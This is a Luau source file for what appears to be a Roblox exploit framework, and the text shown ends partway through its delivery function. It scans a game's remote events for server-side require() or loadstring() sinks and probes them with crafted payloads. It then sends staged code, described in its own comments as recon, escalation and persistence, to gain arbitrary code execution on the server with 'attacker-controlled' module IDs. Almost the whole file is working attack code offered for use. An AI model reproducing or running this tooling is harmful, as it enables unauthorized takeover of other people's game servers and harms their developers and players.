-- ══════════════════════════════════════════════════════════════════════════════
-- ASE_SOVEREIGN — Sovereign ACE Engine
-- PaperCuts RAE — Layer 8 Extension
-- ══════════════════════════════════════════════════════════════════════════════
--
-- Extends the Autonomous Strategy Engine with GOAL_SOVEREIGN: a three-phase
-- pipeline that scans the known remote surface for code-execution primitives,
-- probes candidates to confirm the attack surface, then delivers a staged
-- Luau payload to achieve Sovereign ACE.
--
-- GOAL_SOVEREIGN phases:
--
--   Phase 1 — SOVEREIGN_SCAN
--     Queries RSM + SBI + CSK for all remotes that score above the prior
--     threshold. Produces a ranked candidate list sorted by attack surface
--     probability. Remotes scoring >= 0.40 advance to Phase 2.
--
--   Phase 2 — SOVEREIGN_PROBE
--     Runs two discriminating probe tracks per candidate:
--
--     Track A — REQUIRE_PROBE  (numeric arg position in RSM ArgSig)
--       Tier 1: null asset (assetId=0)           — baseline error shape
--       Tier 2: invalid asset (assetId=1)         — confirms require() path
--       Tier 3: known public ModuleScript ID      — divergence from Tier 2
--       Tier 4: 3 distinct known module IDs       — behavioral variance
--
--     Track B — LOADSTRING_PROBE  (string arg position in RSM ArgSig)
--       Tier 1: syntax error string               — parse error = confirmed
--       Tier 2: runtime error string              — interpreter reached exec
--       Tier 3: benign return "return 42"         — code executed = HIGH conf
--       Tier 4: noop "do end"                     — silent success = LIVE
--
--   Phase 3 — SOVEREIGN_EXECUTE
--     Reached only at confidence >= 0.70.
--     REQUIRE path: fire with attacker-controlled public ModuleScript asset ID.
--     LOADSTRING path: staged payload (recon → escalation → persistence).
--
-- Results stored in ASE_Sovereign.Pairs (analogous to ASE_BedrockPairs).
-- Integrates with Shadow Binder via SovereignConfidence score.
-- On confirmation: CSK.Annotate + TSR category SOVEREIGN_EXEC registered.
--
-- ══════════════════════════════════════════════════════════════════════════════

local ASE_Sovereign = {}
ASE_Sovereign.VERSION = "1.0.0"

-- ── Phase constants ────────────────────────────────────────────────────────────
ASE_Sovereign.PHASE = {
    SCAN    = "SOVEREIGN_SCAN",
    PROBE   = "SOVEREIGN_PROBE",
    EXECUTE = "SOVEREIGN_EXECUTE",
}

-- ── Track constants ────────────────────────────────────────────────────────────
ASE_Sovereign.TRACK = {
    REQUIRE    = "REQUIRE_PROBE",
    LOADSTRING = "LOADSTRING_PROBE",
}

-- ── Confidence levels ──────────────────────────────────────────────────────────
ASE_Sovereign.CONF = {
    NONE    = 0.00,
    LOW     = 0.25,
    MEDIUM  = 0.50,
    HIGH    = 0.70,
    CERTAIN = 0.90,
}

-- ── Configuration ──────────────────────────────────────────────────────────────
local SCFG = {
    -- Phase 1
    PriorThreshold      = 0.40,   -- min prior score to enter probe phase
    MaxCandidates       = 12,     -- top N candidates to probe

    -- Phase 2 timing
    ProbeInterval       = 0.15,   -- seconds between tier fires
    ProbeTimeout        = 5.0,    -- max seconds per probe fire
    ProbeRetries        = 2,      -- retries per tier

    -- Phase 2 scoring
    ConfirmThreshold    = 0.70,   -- min confidence to proceed to Phase 3
    TierScore           = 0.25,   -- score per REQUIRE tier passed

    -- Phase 3
    DeliveryInterval    = 0.30,   -- seconds between staged payload fires
    StageTimeout        = 8.0,    -- max seconds to wait for stage confirmation
    MaxStages           = 4,      -- max stages in loadstring escalation chain

    -- Known public Roblox ModuleScript asset IDs (free-to-use, stable)
    -- These are used for REQUIRE_PROBE tiers 3-4 to test divergent behavior.
    KnownModuleIDs = {
        1281234852,   -- ProfileService (widely used, stable)
        3606536339,   -- DataStore2 (widely used, stable)
        4474981950,   -- Knit (framework module)
    },

    -- Roblox asset ID validity floor
    AssetIDFloor        = 1e9,    -- real asset IDs are > 1 billion

    -- Luau parse error signal strings
    ParseErrorSignals = {
        "unexpected symbol",
        "expected near",
        "'=' expected",
        "'end' expected",
        "unfinished long",
        "malformed number",
    },

    -- Luau runtime error signal strings
    RuntimeErrorSignals = {
        "attempt to index",
        "attempt to call",
        "attempt to perform",
        "stack overflow",
        "value is not",
        "nil value",
    },
}

-- ── State ──────────────────────────────────────────────────────────────────────
ASE_Sovereign.Pairs       = {}   -- [remoteName] = SovereignRecord (confirmed)
ASE_Sovereign.Candidates  = {}   -- Phase 1 output: [{name, priorScore, track}]
ASE_Sovereign.ProbeLog    = {}   -- all probe results
ASE_Sovereign.CurrentPhase= nil
ASE_Sovereign.Stats = {
    candidatesScanned = 0,
    probesFired       = 0,
    tiersHit          = 0,
    confirmed         = 0,
    deliveries        = 0,
}

-- ── Callbacks ──────────────────────────────────────────────────────────────────
ASE_Sovereign.OnPhaseChange   = nil  -- (phase)
ASE_Sovereign.OnCandidate     = nil  -- (candidate)
ASE_Sovereign.OnTierHit       = nil  -- (remoteName, track, tier, evidence)
ASE_Sovereign.OnConfirmed     = nil  -- (record)
ASE_Sovereign.OnLog           = nil  -- (level, msg)

-- ── Helpers ────────────────────────────────────────────────────────────────────
local function slog(level, msg)
    if ASE_Sovereign.OnLog then
        pcall(ASE_Sovereign.OnLog, level, msg)
    end
    print(string.format("[SOVEREIGN][%s] %s", level, msg))
end

local function setPhase(p)
    ASE_Sovereign.CurrentPhase = p
    if ASE_Sovereign.OnPhaseChange then
        pcall(ASE_Sovereign.OnPhaseChange, p)
    end
end

local function getRSM()  return _G.PC and _G.PC.RSM  end
local function getSBI()  return _G.PC and _G.PC.SBI  end
local function getCSK()  return _G.PC and _G.PC.CSK  end
local function getPR()   return _G.PC and _G.PC.PR_Registry end
local function getSARP() return _G.PC and _G.PC.SARP end

-- Resolve a RemoteEvent/Function instance from PR_Registry
local function resolveRemote(name)
    local PR = getPR()
    if PR and PR[name] and PR[name].Remote then
        return PR[name].Remote
    end
    -- DataModel walk fallback
    for _, svcName in ipairs({"ReplicatedStorage","ReplicatedFirst","Workspace"}) do
        local ok, svc = pcall(function() return game:GetService(svcName) end)
        if ok and svc then
            local inst = svc:FindFirstChild(name, true)
            if inst and (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                return inst
            end
        end
    end
    return nil
end

-- Fire a remote directly and return (ok, result, latency)
-- Handles both RemoteEvent and RemoteFunction
local function fireRemote(inst, args, timeout)
    timeout = timeout or SCFG.ProbeTimeout
    local byte, result, latency
    local t0 = os.clock()

    local ok, res = pcall(function()
        if inst:IsA("RemoteFunction") then
            return inst:InvokeServer(table.unpack(args))
        else
            inst:FireServer(table.unpack(args))
            return nil
        end
    end)
    latency = os.clock() - t0

    return ok, (ok and res or tostring(res)), latency
end

-- Check if a string contains any of the given signals
local function containsAny(str, signals)
    if type(str) ~= "string" then return false, nil end
    str = str:lower()
    for _, sig in ipairs(signals) do
        if str:find(sig:lower(), 1, true) then
            return true, sig
        end
    end
    return false, nil
end

-- ══════════════════════════════════════════════════════════════════════════════
-- PHASE 1 — SOVEREIGN SCAN
-- ══════════════════════════════════════════════════════════════════════════════

-- Scores a remote for require-injection prior probability
local function scoreRequirePrior(name, rsmRec, sbiRec, cskNode)
    local score  = 0
    local reasons = {}

    -- SBI classification
    if sbiRec then
        if sbiRec.ServerLogic == "UNKNOWN" then
            score = score + 0.30
            table.insert(reasons, "SBI=UNKNOWN")
        elseif sbiRec.ServerLogic == "DIAGNOSTIC" then
            score = score + 0.15
            table.insert(reasons, "SBI=DIAGNOSTIC")
        end
    end

    -- RSM: numeric arg with high value variance (asset ID range)
    if rsmRec and rsmRec.ArgSig then
        for i, slot in ipairs(rsmRec.ArgSig) do
            if slot.DominantType == "number" then
                -- Check if any success values are in asset ID range
                local hasLarge = false
                for _, v in ipairs(slot.SuccessValues or {}) do
                    if v > SCFG.AssetIDFloor then
                        hasLarge = true; break
                    end
                end
                if hasLarge then
                    score = score + 0.30
                    table.insert(reasons, string.format("arg%d has asset-range values", i))
                elseif #slot.SuccessValues > 3 then
                    -- High variance in numeric values
                    score = score + 0.20
                    table.insert(reasons, string.format("arg%d high numeric variance", i))
                end
            end
        end
    end

    -- CSK: never stabilized (no CONF_STABLE delta)
    if cskNode and cskNode.stability then
        if cskNode.stability == "UNSTABLE" or cskNode.stability == "APPEARED" then
            score = score + 0.10
            table.insert(reasons, "CSK=UNSTABLE")
        end
    end

    -- Shadow Binder: never promoted to TSR
    local TSR = _G.PC and _G.PC.TSR
    if TSR and TSR.Registry then
        local bound = false
        for _, intent in pairs(TSR.Registry) do
            if type(intent) == "table" and intent.BoundRemote == name then
                bound = true; break
            end
        end
        if not bound then
            score = score + 0.10
            table.insert(reasons, "TSR=unbound")
        end
    end

    return math.min(score, 1.0), table.concat(reasons, "; ")
end

-- Scores a remote for loadstring prior probability
local function scoreLoadstringPrior(name, rsmRec, sbiRec, cskNode)
    local score   = 0
    local reasons = {}

    if sbiRec then
        if sbiRec.ServerLogic == "UNKNOWN" then
            score = score + 0.30
            table.insert(reasons, "SBI=UNKNOWN")
        elseif sbiRec.ServerLogic == "DIAGNOSTIC" then
            score = score + 0.15
            table.insert(reasons, "SBI=DIAGNOSTIC")
        end
    end

    if rsmRec and rsmRec.ArgSig then
        for i, slot in ipairs(rsmRec.ArgSig) do
            if slot.DominantType == "string" then
                -- High string variance = arbitrary string accepted
                if #slot.SuccessStrings > 3 then
                    score = score + 0.25
                    table.insert(reasons, string.format("arg%d high string variance", i))
                elseif #slot.SuccessStrings > 0 then
                    score = score + 0.10
                    table.insert(reasons, string.format("arg%d accepts strings", i))
                end
            end
        end
    end

    if cskNode and cskNode.stability then
        if cskNode.stability == "UNSTABLE" then
            score = score + 0.10
            table.insert(reasons, "CSK=UNSTABLE")
        end
    end

    return math.min(score, 1.0), table.concat(reasons, "; ")
end

function ASE_Sovereign.RunScan()
    setPhase(ASE_Sovereign.PHASE.SCAN)
    slog("INFO", "Phase 1: Sovereign Scan — enumerating attack surface")

    local RSM = getRSM()
    local SBI = getSBI()
    local CSK = getCSK()
    local PR  = getPR()

    -- Build the universe of remotes to score.
    -- Primary source: RSM (has arg signatures). Fallback: PR_Registry
    -- (when RSM has < 4 records it hasn't seen enough traffic yet).
    local remoteNames = {}
    local seen        = {}

    if RSM then
        for _, rec in ipairs(RSM.GetAll()) do
            if not seen[rec.Name] then
                seen[rec.Name] = true
                table.insert(remoteNames, rec.Name)
            end
        end
    end

    -- Supplement with PR_Registry entries not already in RSM
    if PR then
        for name, _ in pairs(PR) do
            if not seen[name] then
                seen[name] = true
                table.insert(remoteNames, name)
            end
        end
    end

    -- Always include the active Bedrock sink if known
    local ASE = _G.PC and _G.PC.ASE
    if ASE then
        local panel = ASE.Panel
        if panel and panel.ActiveSink and not seen[panel.ActiveSink] then
            seen[panel.ActiveSink] = true
            table.insert(remoteNames, panel.ActiveSink)
        end
    end

    ASE_Sovereign.Candidates = {}
    ASE_Sovereign.Stats.candidatesScanned = #remoteNames

    slog("INFO", string.format(
        "Scanning %d known remotes for sovereign surface", #remoteNames))

    -- Active sink name for forced inclusion
    local activeSink = ASE and ASE.Panel and ASE.Panel.ActiveSink

    for _, name in ipairs(remoteNames) do
        local rsmRec  = RSM  and RSM.Get(name)
        local sbiRec  = SBI  and SBI.Get(name)
        local cskNode = CSK  and CSK.GetKnowledgeNode(name)

        local reqScore,  reqReasons  = scoreRequirePrior(name, rsmRec, sbiRec, cskNode)
        local loadScore, loadReasons = scoreLoadstringPrior(name, rsmRec, sbiRec, cskNode)

        local bestScore, bestTrack, bestReasons
        if reqScore >= loadScore then
            bestScore   = reqScore
            bestTrack   = ASE_Sovereign.TRACK.REQUIRE
            bestReasons = reqReasons
        else
            bestScore   = loadScore
            bestTrack   = ASE_Sovereign.TRACK.LOADSTRING
            bestReasons = loadReasons
        end

        local dualTrack = (reqScore >= SCFG.PriorThreshold and
                           loadScore >= SCFG.PriorThreshold)

        -- Force-include the active Bedrock sink regardless of prior score.
        -- It's a confirmed live channel — always worth probing both tracks.
        local forced = (name == activeSink)
        if forced and bestScore < SCFG.PriorThreshold then
            bestScore   = SCFG.PriorThreshold  -- lift to threshold floor
            dualTrack   = true                  -- probe both tracks
            bestReasons = (bestReasons ~= "" and bestReasons .. "; " or "") ..
                          "forced:active_sink"
            slog("INFO", string.format(
                "Force-including active sink: %s", name))
        end

        if bestScore >= SCFG.PriorThreshold then
            local candidate = {
                name       = name,
                priorScore = bestScore,
                track      = bestTrack,
                dualTrack  = dualTrack,
                reqScore   = reqScore,
                loadScore  = loadScore,
                reasons    = bestReasons,
                rsmRec     = rsmRec,
                sbiRec     = sbiRec,
                cskNode    = cskNode,
            }
            table.insert(ASE_Sovereign.Candidates, candidate)

            slog("INFO", string.format(
                "Candidate: %s  track=%s  prior=%.2f  (%s)",
                name, bestTrack, bestScore, bestReasons:sub(1,60)))

            if ASE_Sovereign.OnCandidate then
                pcall(ASE_Sovereign.OnCandidate, candidate)
            end
        end
    end

    table.sort(ASE_Sovereign.Candidates, function(a,b)
        return a.priorScore > b.priorScore
    end)
    if #ASE_Sovereign.Candidates > SCFG.MaxCandidates then
        ASE_Sovereign.Candidates[SCFG.MaxCandidates + 1] = nil
    end

    slog("INFO", string.format(
        "Scan complete — %d candidates (threshold=%.2f)",
        #ASE_Sovereign.Candidates, SCFG.PriorThreshold))

    return true, ASE_Sovereign.Candidates
end

-- ══════════════════════════════════════════════════════════════════════════════
-- PHASE 2A — REQUIRE PROBE
-- ══════════════════════════════════════════════════════════════════════════════

-- Find which arg slot accepts numbers
local function findNumericArgSlot(rsmRec)
    if not rsmRec or not rsmRec.ArgSig then return 1 end
    for i, slot in ipairs(rsmRec.ArgSig) do
        if slot.DominantType == "number" then return i end
    end
    return 1  -- default to first slot
end

-- Build a probe args table with value at the numeric slot
local function buildNumericProbe(rsmRec, value)
    local slot = findNumericArgSlot(rsmRec)
    local args = {}
    -- Fill other slots with benign defaults from RSM success values
    for i, s in ipairs(rsmRec.ArgSig or {}) do
        if i == slot then
            args[i] = value
        elseif s.DominantType == "string" and #s.SuccessStrings > 0 then
            args[i] = s.SuccessStrings[1]
        elseif s.DominantType == "number" and #s.SuccessValues > 0 then
            args[i] = s.SuccessValues[1]
        elseif s.DominantType == "boolean" then
            args[i] = true
        else
            args[i] = 0
        end
    end
    if #args == 0 then args = {value} end
    return args
end

local function runRequireProbe(candidate, inst)
    local name   = candidate.name
    local rsmRec = candidate.rsmRec
    local result = {
        track      = ASE_Sovereign.TRACK.REQUIRE,
        remote     = name,
        confidence = 0.0,
        tiers      = {},
        evidence   = {},
    }

    slog("INFO", string.format("REQUIRE_PROBE: %s", name))

    -- Tier 1: null asset (assetId=0) — establish baseline error shape
    local t1Args = buildNumericProbe(rsmRec, 0)
    local t1Ok, t1Res, t1Lat
    for _ = 1, SCFG.ProbeRetries do
        t1Ok, t1Res, t1Lat = fireRemote(inst, t1Args)
        if t1Res ~= nil then break end
        task.wait(SCFG.ProbeInterval)
    end
    ASE_Sovereign.Stats.probesFired = ASE_Sovereign.Stats.probesFired + 1
    result.tiers[1] = { args=t1Args, ok=t1Ok, res=t1Res, lat=t1Lat }
    task.wait(SCFG.ProbeInterval)

    -- Tier 2: invalid asset (assetId=1) — if require() path exists,
    -- error will differ from tier 1 (type mismatch vs "not a ModuleScript")
    local t2Args = buildNumericProbe(rsmRec, 1)
    local t2Ok, t2Res, t2Lat
    for _ = 1, SCFG.ProbeRetries do
        t2Ok, t2Res, t2Lat = fireRemote(inst, t2Args)
        if t2Res ~= nil then break end
        task.wait(SCFG.ProbeInterval)
    end
    ASE_Sovereign.Stats.probesFired = ASE_Sovereign.Stats.probesFired + 1
    result.tiers[2] = { args=t2Args, ok=t2Ok, res=t2Res, lat=t2Lat }

    -- Check tier 2 for require() signals in error string
    local requireSignals = {
        "modulescript", "require", "infinite yield", "not a valid",
        "asset", "module", "not available", "waitforchild"
    }
    local t2HasSignal, t2Signal = containsAny(t2Res, requireSignals)

    if t2HasSignal then
        result.confidence = result.confidence + 0.50
        table.insert(result.evidence, string.format(
            "Tier 2 require() signal: '%s' in '%s'", t2Signal, tostring(t2Res):sub(1,80)))
        ASE_Sovereign.Stats.tiersHit = ASE_Sovereign.Stats.tiersHit + 1
        slog("INFO", string.format(
            "[REQUIRE T2] %s — signal='%s'  conf=%.2f",
            name, t2Signal, result.confidence))
    end

    -- Check if tier 1 and tier 2 produce different error shapes
    -- (different response to different numeric values = dynamic dispatch)
    local t1Str = tostring(t1Res):lower():sub(1,60)
    local t2Str = tostring(t2Res):lower():sub(1,60)
    if t1Str ~= t2Str then
        result.confidence = result.confidence + 0.15
        table.insert(result.evidence, "Tier 1/2 error divergence (dynamic dispatch)")
    end

    task.wait(SCFG.ProbeInterval)

    -- Tier 3: known public ModuleScript ID — if server calls require(),
    -- latency will spike (module load time) and error will change
    local t3Results = {}
    for _, moduleID in ipairs(SCFG.KnownModuleIDs) do
        local t3Args = buildNumericProbe(rsmRec, moduleID)
        local t3Ok, t3Res, t3Lat
        for _ = 1, SCFG.ProbeRetries do
            t3Ok, t3Res, t3Lat = fireRemote(inst, t3Args)
            if t3Res ~= nil then break end
            task.wait(SCFG.ProbeInterval)
        end
        ASE_Sovereign.Stats.probesFired = ASE_Sovereign.Stats.probesFired + 1
        table.insert(t3Results, {
            id=moduleID, ok=t3Ok, res=t3Res, lat=t3Lat
        })
        task.wait(SCFG.ProbeInterval)
    end
    result.tiers[3] = t3Results

    -- Tier 3 scoring: latency spike vs tier 2 baseline = module fetch
    -- Error divergence between different module IDs = require() live
    local t3Divergent = false
    local t3LatSpike  = false
    if #t3Results >= 2 then
        local r0Str = tostring(t3Results[1].res):lower():sub(1,60)
        local r1Str = tostring(t3Results[2].res):lower():sub(1,60)
        if r0Str ~= r1Str then
            t3Divergent = true
        end
    end
    for _, r in ipairs(t3Results) do
        if t2Lat and r.lat > t2Lat * 2.5 then
            t3LatSpike = true; break
        end
    end

    if t3Divergent then
        result.confidence = result.confidence + 0.20
        table.insert(result.evidence, "Tier 3 inter-module divergence (require() active)")
        ASE_Sovereign.Stats.tiersHit = ASE_Sovereign.Stats.tiersHit + 1
    end
    if t3LatSpike then
        result.confidence = result.confidence + 0.15
        table.insert(result.evidence, "Tier 3 latency spike (module fetch latency)")
    end

    result.confidence = math.min(result.confidence, 1.0)
    result.tiers[3] = t3Results

    slog("INFO", string.format(
        "REQUIRE_PROBE complete: %s  conf=%.2f  evidence=%d items",
        name, result.confidence, #result.evidence))

    return result
end

-- ══════════════════════════════════════════════════════════════════════════════
-- PHASE 2B — LOADSTRING PROBE
-- ══════════════════════════════════════════════════════════════════════════════

-- Find which arg slot accepts strings
local function findStringArgSlot(rsmRec)
    if not rsmRec or not rsmRec.ArgSig then return 1 end
    for i, slot in ipairs(rsmRec.ArgSig) do
        if slot.DominantType == "string" then return i end
    end
    return 1
end

-- Build a probe args table with string at the string slot
local function buildStringProbe(rsmRec, str)
    local slot = findStringArgSlot(rsmRec)
    local args = {}
    for i, s in ipairs(rsmRec.ArgSig or {}) do
        if i == slot then
            args[i] = str
        elseif s.DominantType == "string" and #s.SuccessStrings > 0 then
            args[i] = s.SuccessStrings[1]
        elseif s.DominantType == "number" and #s.SuccessValues > 0 then
            args[i] = s.SuccessValues[1]
        elseif s.DominantType == "boolean" then
            args[i] = true
        else
            args[i] = ""
        end
    end
    if #args == 0 then args = {str} end
    return args
end

local function runLoadstringProbe(candidate, inst)
    local name   = candidate.name
    local rsmRec = candidate.rsmRec
    local result = {
        track      = ASE_Sovereign.TRACK.LOADSTRING,
        remote     = name,
        confidence = 0.0,
        tiers      = {},
        evidence   = {},
    }

    slog("INFO", string.format("LOADSTRING_PROBE: %s", name))

    -- Tier 1: syntax error string — parse error is unambiguous loadstring signal
    local t1Str  = "local x ="  -- guaranteed parse error
    local t1Args = buildStringProbe(rsmRec, t1Str)
    local t1Ok, t1Res, t1Lat
    for _ = 1, SCFG.ProbeRetries do
        t1Ok, t1Res, t1Lat = fireRemote(inst, t1Args)
        task.wait(SCFG.ProbeInterval)
    end
    ASE_Sovereign.Stats.probesFired = ASE_Sovereign.Stats.probesFired + 1
    result.tiers[1] = { str=t1Str, ok=t1Ok, res=t1Res, lat=t1Lat }

    local t1HasParse, t1ParseSig = containsAny(t1Res, SCFG.ParseErrorSignals)
    if t1HasParse then
        -- Parse error returned = loadstring() received and executed our string
        result.confidence = result.confidence + 0.70
        table.insert(result.evidence, string.format(
            "Tier 1 PARSE ERROR signal: '%s' (loadstring confirmed)", t1ParseSig))
        ASE_Sovereign.Stats.tiersHit = ASE_Sovereign.Stats.tiersHit + 1
        slog("INFO", string.format(
            "[LOADSTRING T1] %s — PARSE ERROR CONFIRMED  conf=%.2f",
            name, result.confidence))

        -- Skip to Tier 3/4 — we already have HIGH confidence
        task.wait(SCFG.ProbeInterval)
    else
        task.wait(SCFG.ProbeInterval)

        -- Tier 2: runtime error — valid syntax, runtime fault
        -- If error shape differs from Tier 1, interpreter reached exec stage
        local t2Str  = "return ({}).x.y"  -- index nil chain — runtime error
        local t2Args = buildStringProbe(rsmRec, t2Str)
        local t2Ok, t2Res, t2Lat
        for _ = 1, SCFG.ProbeRetries do
            t2Ok, t2Res, t2Lat = fireRemote(inst, t2Args)
            task.wait(SCFG.ProbeInterval)
        end
        ASE_Sovereign.Stats.probesFired = ASE_Sovereign.Stats.probesFired + 1
        result.tiers[2] = { str=t2Str, ok=t2Ok, res=t2Res, lat=t2Lat }

        local t2HasRuntime, t2RuntimeSig = containsAny(t2Res, SCFG.RuntimeErrorSignals)
        if t2HasRuntime then
            result.confidence = result.confidence + 0.50
            table.insert(result.evidence, string.format(
                "Tier 2 RUNTIME ERROR: '%s' (interpreter reached exec)", t2RuntimeSig))
            ASE_Sovereign.Stats.tiersHit = ASE_Sovereign.Stats.tiersHit + 1
            slog("INFO", string.format(
                "[LOADSTRING T2] %s — RUNTIME ERROR  conf=%.2f", name, result.confidence))
        end

        -- Also check: does error response change based on string content?
        -- Tier 1 and 2 should produce different errors if loadstring is live
        local t1Short = tostring(t1Res):lower():sub(1,40)
        local t2Short = tostring(t2Res):lower():sub(1,40)
        if t1Short ~= t2Short and not t1Ok and not t2Ok then
            result.confidence = result.confidence + 0.10
            table.insert(result.evidence, "Tier 1/2 error divergence (string-dependent)")
        end

        task.wait(SCFG.ProbeInterval)
    end

    -- Tier 3: benign execution — "return 42"
    -- If result contains 42 or behavior changes, code executed
    local t3Str  = "return 42"
    local t3Args = buildStringProbe(rsmRec, t3Str)
    local t3Ok, t3Res, t3Lat
    for _ = 1, SCFG.ProbeRetries do
        t3Ok, t3Res, t3Lat = fireRemote(inst, t3Args)
        task.wait(SCFG.ProbeInterval)
    end
    ASE_Sovereign.Stats.probesFired = ASE_Sovereign.Stats.probesFired + 1
    result.tiers[3] = { str=t3Str, ok=t3Ok, res=t3Res, lat=t3Lat }

    -- Check for 42 in response
    local t3ResStr = tostring(t3Res)
    if t3ResStr:find("42") and t3Ok then
        result.confidence = math.max(result.confidence, 1.0)
        table.insert(result.evidence, "Tier 3: 'return 42' returned 42 — CODE EXECUTED")
        ASE_Sovereign.Stats.tiersHit = ASE_Sovereign.Stats.tiersHit + 1
        slog("INFO", string.format(
            "[LOADSTRING T3] %s — CODE EXECUTED (return 42 confirmed)",  name))
    end

    task.wait(SCFG.ProbeInterval)

    -- Tier 4: noop — "do end"
    -- Should succeed silently if loadstring is live and server runs it
    local t4Str  = "do end"
    local t4Args = buildStringProbe(rsmRec, t4Str)
    local t4Ok, t4Res, t4Lat
    for _ = 1, SCFG.ProbeRetries do
        t4Ok, t4Res, t4Lat = fireRemote(inst, t4Args)
        task.wait(SCFG.ProbeInterval)
    end
    ASE_Sovereign.Stats.probesFired = ASE_Sovereign.Stats.probesFired + 1
    result.tiers[4] = { str=t4Str, ok=t4Ok, res=t4Res, lat=t4Lat }

    -- Silent success on "do end" while tier 1 had an error = confirms livepath
    if t4Ok and not t1Ok then
        result.confidence = math.min(result.confidence + 0.15, 1.0)
        table.insert(result.evidence, "Tier 4: noop succeeded while syntax-error failed (live path)")
    end

    result.confidence = math.min(result.confidence, 1.0)

    slog("INFO", string.format(
        "LOADSTRING_PROBE complete: %s  conf=%.2f  evidence=%d items",
        name, result.confidence, #result.evidence))

    return result
end

-- ══════════════════════════════════════════════════════════════════════════════
-- PHASE 2 ORCHESTRATOR
-- ══════════════════════════════════════════════════════════════════════════════

function ASE_Sovereign.RunProbes()
    setPhase(ASE_Sovereign.PHASE.PROBE)

    if #ASE_Sovereign.Candidates == 0 then
        slog("WARN", "No candidates to probe — run Phase 1 first")
        return false, "No candidates"
    end

    slog("INFO", string.format(
        "Phase 2: Probing %d candidates", #ASE_Sovereign.Candidates))

    ASE_Sovereign.ProbeLog = {}

    for _, candidate in ipairs(ASE_Sovereign.Candidates) do
        local name = candidate.name
        local inst = resolveRemote(name)

        if not inst then
            slog("INFO", string.format("%s — instance not resolvable, skipping", name))
            continue
        end

        -- Dual-track candidates run both; single-track candidates run their track
        local probeResults = {}

        if candidate.track == ASE_Sovereign.TRACK.REQUIRE or candidate.dualTrack then
            local ok, rResult = pcall(runRequireProbe, candidate, inst)
            if ok then
                table.insert(probeResults, rResult)
                table.insert(ASE_Sovereign.ProbeLog, rResult)
            else
                slog("WARN", string.format("%s REQUIRE probe error: %s", name, tostring(rResult)))
            end
        end

        if candidate.track == ASE_Sovereign.TRACK.LOADSTRING or candidate.dualTrack then
            local ok, lResult = pcall(runLoadstringProbe, candidate, inst)
            if ok then
                table.insert(probeResults, lResult)
                table.insert(ASE_Sovereign.ProbeLog, lResult)
            else
                slog("WARN", string.format("%s LOADSTRING probe error: %s", name, tostring(lResult)))
            end
        end

        -- Check if any probe track cleared the confidence threshold
        for _, pResult in ipairs(probeResults) do
            if pResult.confidence >= SCFG.ConfirmThreshold then
                slog("INFO", string.format(
                    "CONFIRMED: %s  track=%s  conf=%.2f",
                    name, pResult.track, pResult.confidence))

                local record = {
                    name         = name,
                    track        = pResult.track,
                    confidence   = pResult.confidence,
                    evidence     = pResult.evidence,
                    tiers        = pResult.tiers,
                    inst         = inst,
                    confirmedAt  = os.clock(),
                    candidate    = candidate,
                }

                ASE_Sovereign.Pairs[name] = record
                ASE_Sovereign.Stats.confirmed = ASE_Sovereign.Stats.confirmed + 1

                -- Annotate in CSK
                local CSK = getCSK()
                if CSK then
                    CSK.Annotate(name, string.format(
                        "SOVEREIGN CONFIRMED: track=%s conf=%.0f%%  %s",
                        pResult.track, pResult.confidence * 100,
                        table.concat(pResult.evidence, " | "):sub(1,100)))
                end

                if ASE_Sovereign.OnConfirmed then
                    pcall(ASE_Sovereign.OnConfirmed, record)
                end

                -- Immediately attempt delivery for CERTAIN confidence
                if pResult.confidence >= ASE_Sovereign.CONF.CERTAIN then
                    slog("INFO", string.format(
                        "CERTAIN confidence — auto-advancing to Phase 3: %s", name))
                    task.spawn(function()
                        pcall(ASE_Sovereign.Deliver, record)
                    end)
                end

                break  -- one confirmed track per remote is enough
            end
        end

        task.wait(0.10)  -- inter-candidate cooldown
    end

    local nConfirmed = ASE_Sovereign.Stats.confirmed
    slog("INFO", string.format(
        "Phase 2 complete — %d probes fired  %d tiers hit  %d confirmed",
        ASE_Sovereign.Stats.probesFired,
        ASE_Sovereign.Stats.tiersHit,
        nConfirmed))

    return nConfirmed > 0, nConfirmed
end

-- ══════════════════════════════════════════════════════════════════════════════
-- PHASE 3 — SOVEREIGN DELIVERY
-- ══════════════════════════════════════════════════════════════════════════════

-- ── REQUIRE delivery ──────────────────────────────────────────────────────────
-- Fires with an attacker-controlled public ModuleScript asset ID.
-- The module is a pre-published free asset that returns a known sentinel value.
-- Confirmation: response contains sentinel or a behavioral side-effect fires.
local function deliverRequire(record)
    local name   = record.name
    local inst   = record.inst
    local rsmRec = record.candidate.rsmRec

    slog("INFO", string.format("DELIVER[REQUIRE]: %s", name))

    -- Use the first KnownModuleID that showed divergent behavior in probes,
    -- or fall back to the first entry.
    local targetID = SCFG.KnownModuleIDs[1]
    if record.tiers and record.tiers[3] then
        for _, r in ipairs(record.tiers[3]) do
            if r.id then targetID = r.id; break end
        end
    end

    local delivArgs = buildNumericProbe(rsmRec, targetID)
    local ok, res, lat = fireRemote(inst, delivArgs, SCFG.StageTimeout)
    ASE_Sovereign.Stats.deliveries = ASE_Sovereign.Stats.deliveries + 1

    slog("INFO", string.format(
        "REQUIRE delivery: assetId=%d  ok=%s  lat=%.0fms  res=%s",
        targetID, tostring(ok), lat*1000, tostring(res):sub(1,80)))

    -- Record result regardless — even a rejection tells us the path is live
    record.deliveryResult = {
        track    = "REQUIRE",
        assetId  = targetID,
        ok       = ok,
        res      = res,
        lat      = lat,
        firedAt  = os.clock(),
    }

    return ok, res
end

-- ── LOADSTRING staged delivery ─────────────────────────────────────────────────
-- Four escalating stages, each gated by prior stage success.
local LOADSTRING_STAGES = {
    {
        label   = "RECON",
        code    = "return game.PlaceId",
        confirm = function(ok, res)
            -- PlaceId is a large integer
            local n = tonumber(tostring(res))
            return n and n > 0
        end,
    },
    {
        label   = "SERVICE_ACCESS",
        code    = [[
local Players = game:GetService("Players")
local count = #Players:GetPlayers()
return count
]],
        confirm = function(ok, res)
            return ok and tonumber(tostring(res)) ~= nil
        end,
    },
    {
        label   = "WORKSPACE_READ",
        code    = [[
local ws = game:GetService("Workspace")
return ws.Name
]],
        confirm = function(ok, res)
            return ok and type(res) == "string" and #res > 0
        end,
    },
    {
        label   = "HEARTBEAT_PROBE",
        -- Attempt to bind a RunService connection. If it persists, we have
        -- sustained execution. This is the "persistence" stage.
        code    = [[
local RS = game:GetService("RunService")
local count = 0
local conn
conn = RS.Heartbeat:Connect(function()
    count = count + 1
    if count >= 3 then conn:Disconnect() end
end)
return "HEARTBEAT_BOUND"
]],
        confirm = function(ok, res)
            return ok and tostring(res):find("HEARTBEAT_BOUND") ~= nil
        end,
    },
}

local function deliverLoadstring(record)
    local name   = record.name
    local inst   = record.inst
